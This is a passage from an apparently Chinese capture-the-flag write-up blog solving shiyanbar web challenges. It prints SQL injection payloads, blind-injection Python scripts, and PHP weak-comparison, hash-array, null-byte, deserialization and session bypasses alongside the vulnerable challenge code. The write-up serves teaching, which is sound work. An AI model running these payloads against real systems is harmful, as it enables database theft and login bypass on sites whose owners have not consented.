table_schema=database()),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="comment"># table_name: flag@web1</span></span><br><span class="line">payload2 = <span class="string">"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where table_name='flag'),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="comment"># column_name = flag@id</span></span><br><span class="line">payload3 = <span class="string">"?id=0' or (substr((select group_concat(flag separator '@') from flag),&#123;&#125;,1)='&#123;&#125;')%23"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">30</span>):</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> words:</span><br><span class="line">		res = requests.get(url + payload3.format(str(i),item)).text</span><br><span class="line">		<span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">			flag += item</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">if</span> item == <span class="string">'-'</span>:</span><br><span class="line">			print(<span class="string">'end'</span>)</span><br><span class="line"><span class="comment"># flag&#123;y0u_@r3_5o_damn_90od&#125; 大小写可能有问题</span></span><br></pre></td></tr></table></figure>
<p>本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。</p>
<h1 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h1><p>线简单测试一下 <code>id=1&#39;</code> 页面回显报错，尝试报错注入，可以得到数据库名为 <code>web1</code> ，在尝试一下过滤了那些字符没回发现过滤了许多字符 <code>from</code> , <code>where</code> ,<br><code>group_concat</code> , <code>order</code> , <code>union</code> ，这里有许多字符过滤时另加了一个空格，很恶心。</p>
<p>最后用报错注入老是有问题，后来决定换union试一下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=0' uunion nion selselect ect group_congroup_concatcat(table_name) frfrom om information_schema.tables whwhere ere <span class="attribute">table_sctable_schemahema</span>=<span class="string">'web1</span></span><br></pre></td></tr></table></figure>
<p>可知表名<code>flag,web_1</code> ,</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=0' uunion nion selselect ect group_congroup_concatcat(colucolumn_namemn_name) frfrom om informinformatiion_schemaation_schema.columns whwhere ere <span class="attribute">table_name</span>=<span class="string">'flag</span></span><br></pre></td></tr></table></figure>
<p>结果返回权限不够</p>
<blockquote>
<p>SELECT command denied to user ‘web1’@’localhost’ for table ‘columns’</p>
</blockquote>
<p>又看到题目说获取flag值，猜测列名应该是flag，</p>
<p>最终payload</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span><span class="string">' uunion nion selselect ect flag frfrom om flag whwhere ere '</span><span class="keyword">a</span><span class="string">'='</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>
<h1 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h1><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>'%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>可以正常回显，加空格则不可以，说明过滤了空格，后面测试发现还过滤了括号。空格的绕过可以用/**/绕过，括号的话本题返回的结果数为所有结果，所以其实并不需要括号</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>'<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables%<span class="number">23</span></span><br><span class="line">?id=<span class="number">-1</span>'<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span>column_name<span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="built_in">where</span><span class="comment">/**/</span>table_name='flag'%<span class="number">23</span></span><br><span class="line">?id=<span class="number">-1</span>'<span class="comment">/**/</span><span class="built_in">union</span><span class="comment">/**/</span><span class="built_in">select</span><span class="comment">/**/</span>flag<span class="comment">/**/</span>from<span class="comment">/**/</span>flag%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<h1 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单"></a>这个看起来有点简单</h1><p>很常规的一套操作</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/8/<span class="keyword">index</span>.php?id=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure>
<p>后面的省略</p>
<h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>查看元素即可得到源码，这是基础，源码位置在 <code>source.txt</code> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"姘村彲杞借垷锛屼害鍙禌鑹囷紒"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>关键代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一道绕过要求必须返回结果切值返回一行结果，可以考虑limit，由于逗号也被过滤了，故可以使用offset来控制返回的结果个数，例如：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="attribute">1</span>=1 limit 1 offset 0</span><br></pre></td></tr></table></figure>
<p>但是这里第二道过滤要求提交的密码和数据库中的对应的密码相同，这个就困难了，因为我们并不知道数据库中的pwd字段值，所以这个时候看了别的大佬想到了rollup，说来惭愧，这个我之前学习SQL的时候还专门看过，结果在这题却没有想到，哎，真的是菜鸡，为什么可以用rollup原理可以在我的博客中《SQL学习笔记三》中找到，原理就是使用rollup子句会多产生一个汇总行，如果我们没有指定聚合函数，那么它的值就会是NULL，rollup子句是和group by子句一起使用的，只会在group指定的列中产生汇总行，那么就可尝试构造payload了</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>=uname=' <span class="keyword">or</span> <span class="attribute">1</span>=1<span class="built_in"> group </span>by pwd with rollup limit 1 offset 2#&amp;pwd=</span><br></pre></td></tr></table></figure>
<p>这里通过更改offset后面的数字值来使数据库返回有NULL的那一行即可，至于pwd值可以利用PHP弱比较，空字符与NULL相比较会返回true，所以我们pwd不传参即可是比较返回true。</p>
<p>注意：这题用的rollup子句我在自己的数据库上试了之后发现不行，原因在于sql_mode的设置，查看一下数据库的该值</p>
<blockquote>
<p>Variable_name | Value<br>sql_mode       | ONLY_FULL_GROUP_BY,STRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER</p>
</blockquote>
<p>默认会设置有 <font face="futura">ONLY_FULL_GROUP_BY</font>这个模式，此时group by子句中必须包含所查询的所有列，具体的信息可以查看我的之前那篇博客，这是默认开启的，而此题目该模式应该是关闭的，运行命令</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">set</span> GLOBAL <span class="attribute">sql_mode</span>=<span class="string">'TRICT_ALL_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER'</span></span><br></pre></td></tr></table></figure>
<p>如此即可以在自己的数据库上实现相同的效果。</p>
<h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>查看元素，发现语句</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">test</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>]; <span class="variable">$test</span>=md5(<span class="variable">$test</span>); <span class="keyword">if</span>(<span class="variable">$test</span>==<span class="string">'0'</span>)</span></span><br></pre></td></tr></table></figure>
<p>可知是利用md5弱比较，</p>
<p>故提交username为 <code>s878926199a</code> ,即可得到下一个页面地址，得到如下语句</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">unserialize_str = <span class="variable">$_POST</span>[<span class="string">'password'</span>]; </span></span><br><span class="line"><span class="meta">$</span><span class="bash">data_unserialize = unserialize(<span class="variable">$unserialize_str</span>); </span></span><br><span class="line"><span class="meta">if($</span><span class="bash">data_unserialize[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>) &#123; </span></span><br><span class="line"><span class="meta">	print_r($</span><span class="bash">flag); </span></span><br><span class="line">&#125; </span><br><span class="line">伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br></pre></td></tr></table></figure>
<p>看代码可知是简单的反序列化的应用，但是比较坑的是这儿的user和pass的值是布尔true，因为题目提示了成也布尔，败也布尔（23333）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">a[<span class="string">'user'</span>] = <span class="literal">true</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">a[<span class="string">'pass'</span>] = <span class="literal">true</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">b = serialize(<span class="variable">$a</span>);</span></span><br><span class="line"><span class="meta">print($</span><span class="bash">b);</span></span><br></pre></td></tr></table></figure>
<p>提交就可以了。</p>
<h1 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h1><p>代码审计，就是绕过的题目的过来吧就好了</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.<span class="keyword">com</span>/indirection\<span class="built_in">index</span>.php/<span class="built_in">index</span>.php</span><br></pre></td></tr></table></figure>
<p>关键点就是还是利用\来替换/，尽管题目限制了\，但是在此处并没有受到限制</p>
<h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>查看元素，发现一段代码</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input <span class="attribute">name</span>=<span class="string">"showsource"</span> <span class="attribute">value</span>=<span class="string">"0"</span> <span class="attribute">type</span>=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure>
<p>直接修改值为1即可查看源代码，然后一波简单操作就得到flag</p>
<h1 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h1><p>先随便输入个邮箱之后页面会返回跳转链接 <code>step2.php?email=youmail@mail.com&amp;check=???????</code> ,访问发现页面会自动跳转到step1.php，抓包看一下发现关键点</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">form</span> action=<span class="string">"submit.php"</span> method=<span class="string">"GET"</span>&gt;</span><br><span class="line">		&lt;h1&gt;æ¾åå¯ç step2&lt;/h1&gt;</span><br><span class="line">		email:&lt;<span class="keyword">input</span> name=<span class="string">"emailAddress"</span> <span class="keyword">type</span>=<span class="string">"text"</span> &lt;<span class="keyword">br</span> /&gt;</span><br><span class="line">		value=<span class="string">"youmail@mail.com"</span>  disable=<span class="string">"true"</span>/&gt;&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line">		<span class="keyword">token</span>:&lt;<span class="keyword">input</span> name=<span class="string">"token"</span> <span class="keyword">type</span>=<span class="string">"text"</span> /&gt;&lt;/<span class="keyword">br</span>&gt;</span><br><span class="line">		&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">"submit"</span> value=<span class="string">"æäº¤"</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">form</span>&gt;</span><br></pre></td></tr></table></figure>
<p>访问submit.php页面，提示不是admin，在查看抓包内容</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">"admin"</span> <span class="attribute">content</span>=<span class="string">"admin@simplexue.com"</span> /&gt;</span><br><span class="line">&lt;meta <span class="attribute">name</span>=<span class="string">"editor"</span> <span class="attribute">content</span>=<span class="string">"Vim"</span> /&gt;</span><br></pre></td></tr></table></figure>
<p>发现是vim编辑器，那么可能是备份文件泄露，访问 .submit.php.swp得到源代码，核心过滤如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br></pre></td></tr></table></figure>
<p>这个用0e即可绕过，剩下的就是admin的邮箱，前面有一段内容 <code>content=&quot;admin@simplexue.com&quot;</code> 猜测可能就是admin邮箱，提交一下果然可以</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>ctf5.shiyanbar.com<span class="regexp">/10/u</span>pload<span class="regexp">/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</span></span><br></pre></td></tr></table></figure>
<h1 id="once-more"><a href="#once-more" class="headerlink" title="once more"></a>once more</h1><p>很简单，ereg()函数截断，只在PHP5中才有，注意要在地址栏中提交因为在题目给的输入框中提交会再次url编码</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1e8</span>%<span class="number">00</span>*-*</span><br></pre></td></tr></table></figure>
<h1 id="Guess-next-session"><a href="#Guess-next-session" class="headerlink" title="Guess next session"></a>Guess next session</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">session_start(); </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'password'</span>])) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($_GET[<span class="string">'password'</span>] == $_SESSION[<span class="string">'password'</span>])</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span> (<span class="string">'Flag: '</span>.$flag);</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">print</span> <span class="string">'&lt;p&gt;Wrong guess.&lt;/p&gt;'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">mt_srand((microtime() ^ rand(<span class="number">1</span>, <span class="number">10000</span>)) % rand(<span class="number">1</span>, <span class="number">10000</span>) + rand(<span class="number">1</span>, <span class="number">10000</span>));</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>题目最后一行给出的应该是密码的生成逻辑，显然是不可能构造出来的，那么我们可以通过修改session(删除掉对应的sessionid)使 <code>$_SESSION[&#39;password&#39;]</code> 为空，那么我们提交一个空的密码那么在验证时就会有 <code>&#39;&#39;==&#39;&#39;</code> 为true，即可验证通过</p>
<h1 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Your password can not be your name!&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Invalid password.&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;Login first!&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>sha1数组绕过即可</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name<span class="string">[]</span>=<span class="number">2</span>&amp;password<span class="string">[]</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><p>查看元素可以看到有个 <code>index.txt</code> ，访问以下得到源码，这里只给出部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(<span class="string">"********"</span>, <span class="string">"*****"</span>, <span class="string">"********"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"phpformysql"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Could not select database"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select pw from php where user='$user'"</span>;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> (!$query) &#123;</span><br><span class="line">	printf(<span class="string">"Error: %s\n"</span>, mysql_error($conn));</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line"><span class="comment">//echo $row["pw"];</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析题目逻辑，先是将输入的密码值md5变换一下，在数据中查询与用户名相等的用户名并提取结果，然后用返回结果对应的密码字段和刚昂MD5变换后的字段比较，如果相等则成功返回flag，我刚开始想思路放在strcasecmp()函数上，思路并不对。这题的突破口在于sql语句，我们可以尝试sql注入，尝试绕过这个user认证字段，即user字段提交</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' <span class="keyword">and</span> <span class="number">0</span>=<span class="number">1</span> <span class="built_in">union</span> <span class="built_in">select</span> 'c4ca4238a0b923820dcc509a6f75849b'<span class="meta">#</span></span><br></pre></td></tr></table></figure>
<p>那么此时数据库返回的$row[pw]就是输入的这段md5值(1的md5值)，我们只需要在密码字段提交1即可绕过了，最终payload</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=' <span class="keyword">and</span> <span class="number">0</span>=<span class="number">1</span> <span class="built_in">union</span> <span class="built_in">select</span> 'c4ca4238a0b923820dcc509a6f75849b'<span class="meta">#&amp;pass=1</span></span><br></pre></td></tr></table></figure>
<h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>url二次编码绕过</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="meta">%</span><span class="number">2568</span><span class="meta">%</span><span class="number">2561</span><span class="meta">%</span><span class="number">2563</span><span class="meta">%</span><span class="number">256</span>b<span class="meta">%</span><span class="number">2565</span><span class="meta">%</span><span class="number">2572</span><span class="meta">%</span><span class="number">2544</span><span class="meta">%</span><span class="number">254</span>a</span><br></pre></td></tr></table></figure>
<h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><p>简单的x-forwarded-for修改即可</p>
<h1 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h1><p>先是随便在admin字段尝试（因为admin字段有回显），当输入 <code>admin&#39; and 1=1#</code> 时返回“登录失败，错误的用户名和密码”，而如果输入 <code>admin&#39; and 1=2#</code> 时，则返回“数据库连接错误”！！，所以这儿是一处注入点</p>
<p>判断数据库长度 <code>admin&#39; and length(database())=4#</code> 可知数据库长度为4，接下来爆库名 <code>?admin=admin&#39; and substr(database(),1,3)=&#39;tes&#39;%23&amp;pass=12456&amp;action=login</code> ,数据库名是 <code>test</code> </p>
<p>盲注脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin' and "</span></span><br><span class="line">dic = <span class="string">',1234567890()qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM_@'</span></span><br><span class="line"><span class="comment"># payload = "substr((Select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line">yes = <span class="string">'错误'</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">table_name = <span class="string">''</span>  <span class="comment"># admin</span></span><br><span class="line">column_name = <span class="string">''</span> <span class="comment"># username,password</span></span><br><span class="line"><span class="comment"># payload = "substr((Select group_concat(column_name) from information_schema.columns where table_name='admin'),&#123;&#125;,1)='&#123;&#125;'%23&amp;pass=12456&amp;action=login"</span></span><br><span class="line">payload = <span class="string">"substr((Select group_concat(username,password) from 